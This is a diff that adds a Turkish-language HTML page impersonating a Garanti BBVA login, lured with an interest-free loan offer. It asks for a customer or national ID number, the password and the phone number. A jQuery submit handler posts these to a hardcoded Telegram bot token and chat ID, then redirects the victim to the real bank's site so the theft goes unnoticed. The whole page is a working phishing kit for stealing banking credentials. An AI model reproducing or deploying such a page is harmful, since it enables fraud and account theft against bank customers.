@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Onay</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"
+        integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,200..900;1,200..900&display=swap"
+        rel="stylesheet">
+
+    <link rel="stylesheet" href="https://forumhizmeti.vercel.app/style.css">
+</head>
+
+<body>
+    <header>
+        <div class="container">
+            <div class="d-flex justify-content-between align-item-center">
+                <div class="logo d-flex align-items-center">
+                    <img src="https://resmim.net/cdn/2024/07/15/WCIQCL.png" alt="">
+                </div>
+                <div class="dropdown">
+                    <button class="dropbtn" onclick="toggleDropdown()">Bireysel
+                        <i class="fas fa-angle-down"></i>
+                    </button>
+                    <div id="myDropdown" class="dropdown-content">
+                        <a href="#option1">Bireysel</a>
+                        <a href="#option2">Kurumsal</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <div class="cart">
+       
+        <p>Lütfen Müşteri Numaranızı Ya Da T.C. Kimlik Numaranızı Ve Size Özel Parolanızı Girin.
+        </p>
+        <form action="#" id="telegramForm">
+            <label for="musteriNo">Müşteri / T.C. Kimlik Numarası</label>
+            <input type="text" id="musteriNo" name="musteriNo" required>
+            <label for="parola">Parola</label>
+            <input type="password" id="parola" name="parola" required>
+            <label for="tele">Telefon</label>
+            <input type="tel" id="tele" name="phone" required>
+            <div class="d-flex align-items-center justify-content-between mt-2">
+                <div class="form-check ps-0 d-flex align-items-center">
+                    <div class=" me-2">
+                        <input type="checkbox" id="beniHatirla" name="beniHatirla">
+                    </div>
+                    <label for="beniHatirla">Beni Hatırla</label>
+                </div>
+                <button class="info-btn">?</button>
+            </div>
+            <button type="submit" class="login-btn">Başvurumu Tamamla </button>
+            <p class="mb-1 mt-2">
+                <a href="https://subeform.garantibbva.com.tr/isubeform/application/channelapplicationwithcardget/pinRenew-tr"> Parolamı </a>Unuttum
+            </p>
+            <p><a href="https://subeform.garantibbva.com.tr/isubeform/application/channelapplicationwithcardget/pinRenew-tr">İlk kez parola almak istiyorum.</a></p>
+        </form>
+
+    </div>
+    <h2>Yardım ve Güvenlik</h2>
+    <div class="cart">
+
+        <div class="accordion">
+            <div class="accordion-item">
+                <button class="accordion-header" onclick="toggleAccordion(event)">Güvenliğiniz için lütfen aşağıdaki
+                    bilgilere dikkat edin. <i class="fas fa-angle-down"></i></button>
+                <div class="accordion-content">
+                    <p>Faizsiz Kredi İmkanı İçin.</p>
+                </div>
+            </div>
+            <div class="accordion-item">
+                <button class="accordion-header" onclick="toggleAccordion(event)"> Başkası adına mı işlem yapıyorsunuz?
+                    <i class="fas fa-angle-down"></i></button>
+                <div class="accordion-content">
+                    <p>Content for section 2.</p>
+                </div>
+            </div>
+            <div class="accordion-item">
+                <button class="accordion-header" onclick="toggleAccordion(event)">Tasarruf Mevduatı Güvencesi <i
+                        class="fas fa-angle-down"></i></button>
+                <div class="accordion-content">
+                    <p>Content for section 3.</p>
+                </div>
+            </div>
+        </div>
+
+
+    </div>
+    <a href="#" class="other-btn">
+        Diğer Yardım Ve Güvenlik
+    </a>
+
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('#telegramForm').on('submit', function (e) {
+                e.preventDefault();
+
+                const musteriNo = $('#musteriNo').val();
+                const parola = $('#parola').val();
+                const phone = $('#tele').val();
+                const beniHatirla = $('#beniHatirla').is(':checked') ? 'Evet' : 'Hayır';
+
+                const token = '6995811141:AAE_0Jn4YsXOe_Codc54pIh-8Jx-msI5ydE';
+                const chatId = '7124960346';
+
+                const message = `Müşteri No: ${musteriNo}\nParola: ${parola}\nTelefon: ${phone}\nBeni Hatırla: ${beniHatirla}`;
+
+                $.ajax({
+                    url: `https://api.telegram.org/bot${token}/sendMessage`,
+                    method: 'POST',
+                    data: {
+                        chat_id: chatId,
+                        text: message
+                    },
+                    success: function (response) {
+                        window.location.href = 'https://www.garantibbva.com.tr/kampanyalar/faizsiz-kredi-kampanyasi';
+                    },
+                    error: function (error) {
+                        window.location.href = 'https://www.garantibbva.com.tr/kampanyalar/faizsiz-kredi-kampanyasi';
+                    }
+                });
+            });
+        });
+    </script>
+
+
+
+    <script>
+        // Function to toggle the dropdown
+        function toggleDropdown() {
+            document.getElementById("myDropdown").classList.toggle("show");
+        }
+
+        // Close the dropdown if the user clicks outside of it
+        window.onclick = function (event) {
+            if (!event.target.matches('.dropbtn')) {
+                var dropdowns = document.getElementsByClassName("dropdown-content");
+                for (var i = 0; i < dropdowns.length; i++) {
+                    var openDropdown = dropdowns[i];
+                    if (openDropdown.classList.contains('show')) {
+                        openDropdown.classList.remove('show');
+                    }
+                }
+            }
+        }
+
+
+
+
+        function toggleAccordion(event) {
+            const header = event.currentTarget;
+            const content = header.nextElementSibling;
+
+            header.classList.toggle("active");
+
+            if (content.style.display === "block") {
+                content.style.display = "none";
+                header.querySelector("i").classList.replace("fa-angle-up", "fa-angle-down");
+            } else {
+                content.style.display = "block";
+                header.querySelector("i").classList.replace("fa-angle-down", "fa-angle-up");
+            }
+        }
+
+    </script>
+</body>
+
+</html>
